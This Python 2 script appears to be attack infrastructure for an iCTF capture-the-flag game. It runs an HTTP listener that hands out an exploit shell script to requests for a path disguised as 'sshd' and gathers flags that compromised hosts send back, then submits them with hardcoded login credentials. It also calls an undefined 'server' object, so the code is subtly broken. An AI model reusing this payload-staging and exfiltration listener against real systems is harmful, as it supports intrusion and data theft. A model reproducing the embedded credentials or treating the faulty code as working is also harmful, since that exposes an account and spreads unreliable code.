from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from ictf import iCTF

# Server config
HOST=''
PORT=8888

# Login config
TEAM_SERVER='http://35.167.152.77/'
USER='surajshah525@gmail.com'
PASS='2cZXX5C6bBMq'

# Exploit File
FILE='./ff.sh'

# Submit Server
submit=None

class GetHandler(BaseHTTPRequestHandler):
	def do_GET(self):
		path = self.path.lstrip('/')
		print path
		if path == 'sshd':
			with open(FILE, 'rb') as f:
				self.wfile.write(f.read())
		if path.startswith('FLG'):
			flags = path.split('/')
			server.submit(flags)

def run():
	global SERVER
	i = iCTF(TEAM_SERVER)
	SERVER = i.login(USER, PASS)
	server_address = (HOST, PORT)
	httpd = HTTPServer(server_address, GetHandler)
	httpd.serve_forever()

run()
